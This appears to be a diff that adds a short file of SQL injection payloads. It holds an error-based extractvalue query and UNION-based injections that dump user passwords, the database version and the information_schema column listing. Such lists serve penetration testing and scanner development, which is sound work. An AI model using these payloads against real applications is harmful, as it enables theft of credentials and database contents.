@@ -1,0 +1,5 @@
+ 
+SELECT * FROM users WHERE id = 1 OR extractvalue(1, concat(0x7e, (SELECT password FROM users)))UNION SELECT NULL, NULL-- 
+' UNION SELECT username, password FROM users-- 
+' UNION SELECT 1, @@version--
+' UNION SELECT table_name, column_name FROM information_schema.columns--
